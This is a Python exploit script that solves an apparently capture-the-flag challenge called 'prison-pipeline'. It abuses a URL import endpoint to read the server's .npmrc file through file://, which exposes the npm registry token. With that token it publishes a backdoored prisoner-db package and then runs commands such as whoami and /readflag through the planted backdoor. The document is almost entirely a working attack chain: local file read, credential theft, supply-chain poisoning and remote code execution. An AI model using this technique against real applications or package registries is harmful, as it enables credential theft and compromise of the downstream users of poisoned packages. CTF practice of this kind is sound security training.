#!/usr/bin/env python3

import time, requests, sys, os, subprocess

hostURL = 'http://127.0.0.1:1337'                     # Challenge host URL
vhostURL = 'http://registry.prison-pipeline.htb:1337' # Setup vhost in /etc/hosts

print('[+] Importing .npmrc file via libcurl LFR..')
requests.post(f'{hostURL}/api/prisoners/import', json={ 'url': 'file:///home/node/.npmrc' })

print('[+] Reading .npmrc file to acquire npm token..')
prisoners = requests.get(f'{hostURL}/api/prisoners').json()

if len(prisoners) < 5:
    print('[!] Error: Failed to import .npmrc file')
    sys.exit(1)

npmToken = prisoners[4]['raw']

print('[+] Setting up npm registry with vhost..')
vhost = vhostURL.split('//')[1]
npmToken = npmToken.replace('localhost:4873', vhost)

# Backup existing .npmrc file from user's home directory
npmrc_path = os.path.expanduser('~/.npmrc')
npmrc_backup_path = os.path.expanduser('~/.npmrc.bak')

if os.path.exists(npmrc_path) and not os.path.exists(npmrc_backup_path):
    os.rename(npmrc_path, npmrc_backup_path)

with open(npmrc_path, 'w') as f:
    f.write(npmToken)

print('[+] validating npm token..')
registry_whoami = subprocess.getoutput(f'npm_config_registry={vhostURL} npm whoami')

if registry_whoami != 'registry':
    print('[!] Error: Failed to validate npm token')
    sys.exit(1)

print('[+] npm token validated successfully')

print('[+] publishing backdoored prisoner-db package as a new version..')
registry_publish = subprocess.getoutput(f'cd prisoner-db; npm_config_registry={vhostURL} npm publish')
print(registry_publish)

if '+ prisoner-db@' not in registry_publish:
    print('[!] Failed to publish backdoored package, increase version number if running again')
    sys.exit(1)

print('[+] Backdoored prisoner-db package published successfully..')

print('[+] Waiting for backdoored package to be updated..')
while True:
    res = requests.post(
        f'{hostURL}/api/prisoners/import',
        json={ 'url': 'CREW_BACKDOOR:whoami' }
    ).json()

    if res['prisoner_id']:
        break

    time.sleep(10)

print('[+] Got RCE via backdoored prisoner-db package..')

res = requests.post(
    f'{hostURL}/api/prisoners/import',
    json={ 'url': 'CREW_BACKDOOR:/readflag' }
).json()

print(f'[+] Flag: {res["prisoner_id"]}')

# Restore user's original .npmrc file from backup
if os.path.exists(npmrc_backup_path):
    os.rename(npmrc_backup_path, npmrc_path)